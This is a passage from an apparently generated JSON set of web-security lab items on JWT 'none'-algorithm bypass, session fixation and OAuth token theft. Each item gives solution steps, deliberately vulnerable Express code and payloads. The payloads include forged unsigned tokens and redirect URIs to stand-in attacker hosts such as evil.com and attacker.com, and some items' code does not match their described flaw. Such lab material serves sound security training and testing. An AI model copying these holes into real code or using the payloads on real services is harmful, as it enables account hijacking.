    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'topsecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.user !== 'admin') return res.status(403).send('Access denied'); res.send('Welcome admin'); } catch (e) { res.status(400).send('Invalid token'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
    ]
  },
  {
    "Lab scenario": "Session fixation via Set-Cookie path scoping",
    "Lab Description": "The application creates a new session for users only after a successful login but uses a fixed session identifier that is scoped to a non-authentication path. Due to improper path scoping on Set-Cookie headers, attackers can fix a session ID before login. To solve: inject a known session ID before the victim logs in and hijack the session after login.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to inspect Set-Cookie headers from GET /search.",
      "Observe Set-Cookie: sessionId=value; Path=/search which is reused after login.",
      "Manually set the cookie sessionId=attackerSessionId via Burp Proxy.",
      "Send the session fixation link to the victim, who logs in while using the attackerSessionId.",
      "Reuse the same attackerSessionId in your session to access /my-account as the victim."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const users = { 'carlos': 's3cr3t' }; const sessions = {}; app.get('/search', (req, res) => { res.setHeader('Set-Cookie', 'sessionId=fixed123; Path=/search'); res.send('Search page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const sid = req.cookies.sessionId; sessions[sid] = username; res.send('Logged in'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionId]; if (user) res.send('Account: ' + user); else res.status(403).send('Forbidden'); }); app.listen(3000);",
    "payloads": [
      "Set-Cookie: sessionId=fixed123; Path=/search",
      "sessionId=fixed123"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token leakage via referer header",
    "Lab Description": "The application uses OAuth 2.0 implicit grant for third-party login and redirects access tokens in the URL fragment (#). However, the application incorrectly loads third-party content after the redirect, exposing the token in the Referer header. To solve: leak Carlos's access token and use it to access his account via the API.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to log in via the third-party OAuth provider.",
      "Observe the redirect contains #access_token= in the URL fragment.",
      "Capture the Referer header from any subsequent third-party content loads after the redirect.",
      "Extract the access_token from the Referer header.",
      "Send GET /api/userinfo with Authorization: Bearer <leaked_token> to access Carlos’s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const users = { 'carlos': 'token-carlos' }; app.get('/callback', (req, res) => { res.send('<iframe src=\"https://cdn.thirdparty.com/widget.js\"></iframe>'); }); app.get('/api/userinfo', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('No auth'); const token = auth.split(' ')[1]; const user = Object.entries(users).find(([k, v]) => v === token); if (user) res.send('User info for ' + user[0]); else res.status(403).send('Invalid token'); }); app.listen(3000);",
    "payloads": [
      "https://target.com/callback#access_token=token-carlos",
      "Authorization: Bearer token-carlos"
    ]
  },
{
  "Lab scenario": "Session Fixation in Cookie-Based Auth Mechanism",
  "Lab Description": "This lab contains a session fixation vulnerability in its cookie-based login process. The application assigns session identifiers before authentication and fails to invalidate them upon login. To solve: Hijack Carlos's session by fixing the session cookie before he logs in and then access his account page.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Intercept the unauthenticated GET /login request using Burp Suite and observe the Set-Cookie header establishing a session ID.",
    "Send the login page link with a preset session ID to Carlos using the fixed cookie (simulate via cookie header in Repeater).",
    "Use sqlmap or OWASP ZAP to confirm that the same session ID persists post-authentication.",
    "Wait or simulate Carlos logging in using that preset session ID.",
    "Replay a GET /my-account request using that fixed session cookie and confirm access to Carlos’s account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'carlospass' }]; let sessions = {}; app.get('/login', (req, res) => { let sid = req.cookies.sid || Math.random().toString(36).substring(2); res.cookie('sid', sid); res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sid] = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sid]; if (username) res.send('Welcome ' + username); else res.send('Unauthorized'); }); app.listen(3000);",
  "payloads": [
    "Cookie: sid=attackersession123",
    "GET /login HTTP/1.1 with attacker-controlled sid cookie",
    "Send login link to victim with preset sid=attackersession123",
    "GET /my-account with Cookie: sid=attackersession123"
  ]
},
{
  "Lab scenario": "JWT None Algorithm Authentication Bypass",
  "Lab Description": "The application uses JWTs for authentication but fails to validate the token signature properly when the 'alg' field is set to 'none'. To solve: Forge a token with the 'none' algorithm to impersonate Carlos and access his account page.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Capture a valid JWT after logging in using Burp Suite or Postman.",
    "Use jwt.io or a custom script to decode the token and inspect the header and payload.",
    "Modify the token header to {\"alg\":\"none\"} and change the payload to {\"username\":\"carlos\"}.",
    "Remove the signature part of the JWT entirely.",
    "Replay the modified token in an Authorization: Bearer header and access /my-account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'jwtpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(403).send('No token'); const token = auth.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { res.send('Welcome ' + decoded.payload.username); } else { jwt.verify(token, 'secret'); res.send('Verified user'); } } catch (err) { res.status(403).send('Invalid token'); } }); app.listen(3000);",
  "payloads": [
    "Header: {\"alg\":\"none\"}",
    "Payload: {\"username\":\"carlos\"}",
    "JWT: base64(header).base64(payload).",
    "Authorization: Bearer <unsigned_token>"
  ]
},
{
  "Lab scenario": "OAuth Redirect URI Manipulation for Access Token Theft",
  "Lab Description": "The OAuth 2.0 implementation does not properly validate redirect URIs, allowing an attacker to inject a malicious URI and intercept the authorization code. To solve: Steal an access token for Carlos and use it to access his account via the OAuth-protected API.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Initiate an OAuth flow using the vulnerable app, observe the redirect_uri parameter.",
    "Intercept and modify the redirect_uri to your attacker-controlled domain using Burp Suite.",
    "Receive the authorization code on your domain and extract it.",
    "Exchange the stolen code for an access token via the legitimate /oauth/token endpoint using Postman.",
    "Use the stolen access token in the Authorization: Bearer header to access /api/my-account as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); const tokens = {}; const users = { 'carlos': { id: 1, name: 'Carlos', token: 'car123token' } }; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; res.redirect(redirect_uri + '?code=abc123&state=' + state); }); app.post('/token', (req, res) => { const { code } = req.body; if (code === 'abc123') res.json({ access_token: 'car123token' }); else res.status(400).send('Invalid code'); }); app.get('/api/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = Object.values(users).find(u => u.token === token); if (user) res.json({ user }); else res.status(403).send('Unauthorized'); }); app.listen(4000);",
  "payloads": [
    "GET /authorize?client_id=abc&redirect_uri=https://attacker.com&state=xyz",
    "POST /token with body: code=abc123",
    "Authorization: Bearer car123token",
    "GET /api/my-account"
  ]
},
{
  "Lab scenario": "Session Fixation via Predictable Session ID",
  "Lab Description": "The session management mechanism in this RESTful application issues session IDs before login. The session token is not regenerated upon successful login, allowing an attacker to fix a session ID. The application exposes verbose session tokens during pre-auth requests. To solve: hijack Carlos's session and access his account page.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Intercept GET /prelogin using Burp Suite and extract the session ID issued before login.",
    "Send a POST /login request using the same session ID and valid credentials to confirm reuse.",
    "Craft a phishing URL containing the session ID and send it to Carlos.",
    "When Carlos logs in, reuse the fixed session ID in a new browser session.",
    "Access /my-account to verify hijacked session."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const uuid = require('uuid'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: { password: 'secure123' } }; app.get('/prelogin', (req, res) => { const sid = uuid.v4(); sessions[sid] = null; res.cookie('session', sid); res.send('Pre-auth session initialized'); }); app.post('/login', (req, res) => { const sid = req.cookies.session; const { username, password } = req.body; if (users[username] && users[username].password === password) { sessions[sid] = username; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; if (sessions[sid]) { res.send(`Welcome ${sessions[sid]}`); } else { res.status(403).send('Unauthorized'); } }); app.listen(3000);",
  "payloads": [
    "Phishing URL with fixed session ID: http://victim.site/prelogin?sid=attacker-session-id",
    "Manual Cookie: session=attacker-session-id"
  ]
},
{
  "Lab scenario": "JWT Algorithm Confusion with None Header",
  "Lab Description": "This application uses JWTs to verify user identity, but insecurely trusts the algorithm specified in the token header. The server uses HMAC with a secret key, but doesn't validate the algorithm field properly. To solve: forge a JWT with 'alg' set to 'none' and access the admin's profile.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Capture a valid JWT from an authenticated request using Burp Suite.",
    "Use jwt.io or Postman to decode the JWT and observe 'alg' is HS256.",
    "Craft a new JWT with 'alg' set to 'none' and change payload to {\"user\":\"admin\"}.",
    "Remove the signature part entirely to bypass verification.",
    "Send request to /admin-dashboard with forged JWT in Authorization header."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.user === 'admin') return res.send('Welcome admin'); } else { jwt.verify(token, secret); if (decoded.payload.user === 'admin') return res.send('Welcome admin'); } } catch { res.status(401).send('Unauthorized'); } }); app.listen(4000);",
  "payloads": [
    "Header: {\"alg\":\"none\"}",
    "Payload: {\"user\":\"admin\"}",
    "JWT: base64(header).base64(payload). (no signature)"
  ]
},
{
  "Lab scenario": "OAuth Authorization Code Leakage via Redirect Manipulation",
  "Lab Description": "This OAuth-enabled application uses a vulnerable redirect URI mechanism. The redirect URL is not validated strictly, allowing open redirect exploitation to steal authorization codes. To solve: capture Carlos's OAuth code and exchange it for an access token to access his profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to intercept the redirect flow during OAuth login.",
    "Identify open redirect vulnerability in redirect_uri parameter.",
    "Host a malicious redirect handler to log authorization codes.",
    "Send a phishing OAuth login link with redirect_uri pointing to your server.",
    "Capture code and use Postman to exchange it at /token endpoint and access /user/profile."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokens = {}; app.get('/authorize', (req, res) => { const { redirect_uri, client_id, response_type } = req.query; if (client_id === 'trusted-client' && response_type === 'code') { const code = 'oauth-code-123'; tokens[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}`); } else { res.status(400).send('Invalid request'); } }); app.post('/token', (req, res) => { const { code } = req.body; const user = tokens[code]; if (user) { res.json({ access_token: `token-${user}` }); } else { res.status(401).send('Invalid code'); } }); app.get('/user/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos') res.send('Welcome Carlos'); else res.status(403).send('Unauthorized'); }); app.listen(5000);",
  "payloads": [
    "Redirect URL: https://evil.com/callback",
    "Phishing OAuth link: /authorize?client_id=trusted-client&redirect_uri=https://evil.com/callback&response_type=code",
    "Token exchange: POST /token { code: 'oauth-code-123' }"
  ]
},
{
  "Lab scenario": "GraphQL JWT Expiration Bypass via Clock Skew",
  "Lab Description": "This GraphQL API uses JWTs for authentication and verifies token expiration using `exp`. The application is vulnerable to clock skew due to poor validation of token timestamps. To solve: forge a token with future expiration, exploit clock desync, and access the user's secret notes.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Log in to obtain a valid JWT from Authorization header in GraphQL requests.",
    "Decode JWT and observe 'exp' timestamp.",
    "Use Postman to modify 'exp' to a large future timestamp (e.g., year 2030).",
    "Sign the modified token using the known dev secret exposed in logs.",
    "Send GraphQL request to query { secretNotes } using the forged token."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const secret = 'devmode-secret'; const schema = buildSchema(`type Query { secretNotes: String }`); const root = { secretNotes: (args, context) => { if (context.user === 'carlos') return 'Top Secret Notes'; else throw new Error('Unauthorized'); } }; app.use('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret); req.user = decoded.user; graphqlHTTP({ schema, rootValue: root, context: { user: decoded.user }, graphiql: false })(req, res); } catch { res.status(401).send('Invalid token'); } }); app.listen(6000);",
  "payloads": [
    "JWT payload: {\"user\":\"carlos\",\"exp\":1893456000}",
    "Authorization: Bearer [forged-token]",
    "GraphQL query: { secretNotes }"
  ]
},
{
  "Lab scenario": "Session Fixation in Login Flow via URL Parameter",
  "Lab Description": "The application allows users to specify a session ID via a URL query parameter during login. This session ID is later used without regeneration after authentication. The application trusts the client-supplied session ID even after successful login. To solve: Fix a session ID, trick the victim to log in using it, and access their authenticated session.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to analyze the login request and notice that the session ID is accepted via a GET parameter (?session=).",
    "2. Generate a session ID and craft a phishing URL: /login?session=fixed1234.",
    "3. Send this link to the victim (e.g., simulate by logging in as victim using this link).",
    "4. After victim logs in via the crafted link, the session remains fixed to 'fixed1234'.",
    "5. Set your own cookie to 'session=fixed1234' and access /my-account to hijack victim's session."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'hunter2' }]; const sessions = {}; app.get('/login', (req, res) => { const { session } = req.query; if (session) { res.cookie('session', session); res.send('<form method=\"POST\" action=\"/authenticate\"><input name=\"username\"><input name=\"password\" type=\"password\"><button>Login</button></form>'); } else { res.send('Missing session ID'); } }); app.post('/authenticate', (req, res) => { let body = ''; req.on('data', chunk => body += chunk); req.on('end', () => { const [u, p] = body.split('&').map(p => p.split('=')[1]); const user = users.find(x => x.username === decodeURIComponent(u) && x.password === decodeURIComponent(p)); if (user) { const session = req.cookies.session; sessions[session] = user.username; res.redirect('/my-account'); } else { res.send('Invalid'); } }); }); app.get('/my-account', (req, res) => { const session = req.cookies.session; if (sessions[session]) { res.send(`Welcome ${sessions[session]}`); } else { res.send('Not logged in'); } }); app.listen(4000);",
  "payloads": [
    "GET /login?session=fixed1234",
    "POST /authenticate (with valid creds)",
    "Cookie: session=fixed1234",
    "GET /my-account"
  ]
},
{
  "Lab scenario": "JWT Tampering in Authorization Header using 'none' Algorithm",
  "Lab Description": "This lab uses JWT for session management. The backend verifies JWTs but fails to properly enforce the algorithm specified in the token header. It incorrectly accepts the 'alg':'none' value, skipping signature verification. To solve: Modify a valid JWT by setting alg to none and remove the signature to impersonate Carlos.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Log in with your own account and intercept the Authorization: Bearer <JWT> using Burp Suite.",
    "2. Decode the JWT using jwt.io or Postman and observe the header and payload.",
    "3. Modify the header to {'alg':'none'} and the payload to {'username':'carlos'}",
    "4. Remove the signature portion entirely.",
    "5. Use Postman to send GET /my-account with Authorization: Bearer <tampered_token>."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', password: 'admin123' }]; app.use(express.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); res.send(`Welcome ${decoded.username}`); } catch (err) { res.status(403).send('Invalid token'); } }); app.listen(4001);",
  "payloads": [
    "Header: {\"alg\":\"none\"}",
    "Payload: {\"username\":\"carlos\"}",
    "Token format: base64url(header).base64url(payload)",
    "Authorization: Bearer <tampered_token>"
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration in Redirect URI Validation",
  "Lab Description": "The application integrates OAuth for authentication. However, it fails to strictly validate the redirect_uri parameter, allowing redirection to attacker-controlled domains. The access token is exposed via URL fragment. To solve: Capture Carlos’s access token by injecting an attacker-controlled redirect URI and replay the token.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use OWASP ZAP to intercept the OAuth flow and identify redirect_uri used in /authorize endpoint.",
    "2. Craft a malicious URL: /authorize?client_id=123&redirect_uri=https://evil.com&response_type=token.",
    "3. Simulate sending the link to Carlos and simulate login at /login as Carlos.",
    "4. Observe the token in the fragment at evil.com/#access_token=<token>",
    "5. Use Postman to send Authorization: Bearer <token> to /my-account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const users = [{ username: 'carlos', password: 'qwerty' }]; const tokens = {}; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (response_type === 'token') { const token = Math.random().toString(36).substring(2); tokens[token] = 'carlos'; res.redirect(`${redirect_uri}#access_token=${token}`); } else { res.send('Invalid flow'); } }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; if (tokens[token]) res.send(`Welcome ${tokens[token]}`); else res.send('Invalid token'); }); app.listen(4002);",
  "payloads": [
    "/authorize?client_id=123&redirect_uri=https://evil.com&response_type=token",
    "https://evil.com/#access_token=<leaked_token>",
    "Authorization: Bearer <leaked_token>",
    "GET /my-account"
  ]
},
{
  "Lab scenario": "Session Fixation in Login Flow",
  "Lab Description": "The application uses a session cookie that is not regenerated upon authentication. This enables session fixation, allowing attackers to set a session ID before login. To solve: gain access to Carlos's account by fixing a session and tricking him into logging in with it.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept a GET /login request using Burp Suite Proxy and extract the Set-Cookie header value.",
    "Send Carlos a phishing link embedding the fixed session ID using the session cookie you captured.",
    "Wait for Carlos to log in with the fixed session ID (simulate login using a prepared request or provided browser tools).",
    "Reuse the same session ID in your browser and access /my-account.",
    "Confirm Carlos’s session by accessing /my-account with the hijacked session cookie."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'carlos123' }]; const sessions = {}; app.get('/login', (req, res) => { const sid = req.cookies.sid || Math.random().toString(36).substring(2); res.cookie('sid', sid); res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sid] = username; res.redirect('/my-account'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sid]; if (user) { res.send('Welcome back, ' + user); } else { res.status(403).send('Unauthorized'); } }); app.listen(4001);",
  "payloads": [
    "GET /login HTTP/1.1",
    "Cookie: sid=fixedSessionID",
    "POST /login HTTP/1.1 with fixed sid",
    "Access /my-account using sid=fixedSessionID"
  ]
},
{
  "Lab scenario": "JWT None Algorithm Tampering in Authorization Header",
  "Lab Description": "This app uses JWTs to manage access control. Due to improper validation, it accepts tokens signed with the 'none' algorithm. To solve: tamper with a JWT to impersonate the user carlos and access the protected resource /admin-panel.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Postman to capture a valid JWT from your login using Authorization: Bearer <token>.",
    "Decode the token using jwt.io and observe the algorithm is HS256.",
    "Replace the alg field in the header with 'none' and modify the payload to {\"username\":\"carlos\"}.",
    "Remove the signature part and send the unsigned JWT as Authorization: Bearer <tampered_token> to /admin-panel.",
    "Verify successful access by viewing the admin dashboard with Carlos’s privileges."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecretkey'; const users = [{ username: 'carlos', password: 'jwtpass', role: 'admin' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username, role: user.role }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(403).send('Unauthorized'); } }); app.get('/admin-panel', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret); if (decoded.role === 'admin') { res.send('Welcome Admin ' + decoded.username); } else { res.status(403).send('Access Denied'); } } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(4002);",
  "payloads": [
    "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
    "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
    "Unsigned JWT: <base64Header>.<base64Payload>.",
    "Authorization: Bearer <tampered_token>"
  ]
},
{
  "Lab scenario": "OAuth Authorization Code Interception in Redirect Flow",
  "Lab Description": "This lab has a vulnerable OAuth implementation where the authorization code is sent to an open redirector that leaks it to an attacker. To solve: intercept the code from the OAuth provider and exchange it for an access token to impersonate Carlos.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Start OAuth login flow and observe the redirection to /callback?code=<auth_code>&state=xyz.",
    "Use Burp Suite to modify the redirect_uri to attacker.com/capture during authorization request.",
    "On attacker.com, capture the leaked code from your server logs.",
    "Manually send a POST request to the token endpoint with the stolen code using Postman.",
    "Use the obtained access token to call /userinfo and retrieve Carlos’s profile."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); const oauthTokens = {}; const codes = { 'authcode123': 'carlos_token' }; app.get('/callback', (req, res) => { const code = req.query.code; if (codes[code]) { const token = codes[code]; oauthTokens[token] = 'carlos'; res.send('Access token: ' + token); } else { res.status(400).send('Invalid code'); } }); app.get('/userinfo', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (oauthTokens[token]) { res.send('User info for: ' + oauthTokens[token]); } else { res.status(403).send('Unauthorized'); } }); app.listen(4003);",
  "payloads": [
    "https://auth-server.com/oauth?client_id=xyz&redirect_uri=https://attacker.com/capture",
    "Extract code from /capture endpoint logs",
    "POST /token with code=authcode123",
    "GET /userinfo with Authorization: Bearer carlos_token"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion leading to signature bypass",
  "Lab Description": "This lab's JWT authentication mechanism is vulnerable to algorithm confusion. The application incorrectly accepts unsigned tokens when the alg header is set to 'none'. To solve the lab, gain access to the administrator's account by bypassing the JWT signature verification.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to intercept a valid JWT by logging in with a user account and capturing the Authorization: Bearer token.",
    "In Burp Repeater, decode the JWT and observe that the alg header is set to HS256 and contains a valid signature.",
    "Change the alg field from HS256 to none, and remove the signature part (third segment). Replace the payload's sub value with 'admin'.",
    "Send the modified JWT in an Authorization: Bearer header in a GET request to /admin or /my-account.",
    "If the bypass works, the admin panel will load, solving the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', role: 'admin' }, { username: 'user', role: 'user' }]; const secret = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const user = users.find(u => u.username === username); if (!user) return res.status(401).send('Invalid user'); const token = jwt.sign({ sub: username, role: user.role }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = jwt.decode(token); return res.send(`Welcome ${payload.sub}`); } try { const payload = jwt.verify(token, secret); res.send(`Welcome ${payload.sub}`); } catch (e) { res.status(403).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Algorithm Confusion Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
    "{\"alg\":\"none\"}.{ \"sub\":\"admin\",\"role\":\"admin\" }."
  ]
},
{
  "Lab scenario": "Session fixation via URL-based session ID",
  "Lab Description": "The session management mechanism is vulnerable due to reliance on session IDs passed through URLs. The application does not properly regenerate session identifiers after authentication. To solve the lab, log in as the victim by planting a known session ID before they log in and then reuse it.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to identify that the application transmits session ID using a GET parameter (e.g., /login?sid=...).",
    "Visit the login page and copy the current session ID from the URL.",
    "Send the malicious session ID to the victim (simulate via crafted link or CSRF).",
    "Wait for the victim to authenticate using the same session ID.",
    "Revisit the same session ID yourself to gain access to the authenticated session and access /my-account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const sessions = {}; const users = { 'carlos': 'hunter2' }; app.get('/login', (req, res) => { const sid = req.query.sid || Math.random().toString(36).substr(2); sessions[sid] = sessions[sid] || { loggedIn: false, username: null }; res.send(`<form method='POST' action='/do-login?sid=${sid}'><input name='username'><input name='password'><button>Login</button></form>`); }); app.post('/do-login', (req, res) => { let body = ''; req.on('data', chunk => { body += chunk.toString(); }); req.on('end', () => { const params = new URLSearchParams(body); const { username, password } = Object.fromEntries(params); const sid = req.query.sid; if (users[username] === password) { sessions[sid].loggedIn = true; sessions[sid].username = username; res.redirect(`/my-account?sid=${sid}`); } else { res.send('Login failed'); } }); }); app.get('/my-account', (req, res) => { const sid = req.query.sid; const session = sessions[sid]; if (session && session.loggedIn) { res.send(`Welcome ${session.username}`); } else { res.status(403).send('Not logged in'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "/login?sid=attackerSession123",
    "/do-login?sid=attackerSession123",
    "/my-account?sid=attackerSession123"
  ]
},
{
  "Lab scenario": "OAuth implicit flow token leakage via referer header",
  "Lab Description": "This lab demonstrates a token leakage vulnerability in OAuth 2.0's implicit flow. The access token is embedded in the URL fragment and can leak through referer headers to third-party domains. To solve the lab, capture the admin's token via referer leakage and access their profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to observe that after login, the access_token is passed in the URL fragment (/#access_token=...).",
    "Set up a malicious page on attacker.com which causes a redirect to the OAuth callback endpoint with a link to attacker.com as a resource.",
    "Trick the victim (admin) into visiting this link. Observe the referer header sent to attacker.com containing the access token.",
    "Use the stolen token to access /my-account or /profile endpoint by attaching it as Authorization: Bearer in a request.",
    "If the token is valid, the response will reveal the admin's account details."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const users = { 'admin': { token: 'admintoken123', role: 'admin' } }; app.get('/callback', (req, res) => { res.send(`<script>window.location='#access_token=admintoken123';</script>`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth || !auth.startsWith('Bearer ')) return res.status(401).send('Unauthorized'); const token = auth.split(' ')[1]; const user = Object.entries(users).find(([_, u]) => u.token === token); if (user) return res.send(`Welcome ${user[0]}`); res.status(403).send('Invalid token'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Referer Leak Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "http://attacker.com/#access_token=admintoken123",
    "Authorization: Bearer admintoken123"
  ]
},
{
  "Lab scenario": "Session Fixation via Cookie Injection in OAuth Redirect Flow",
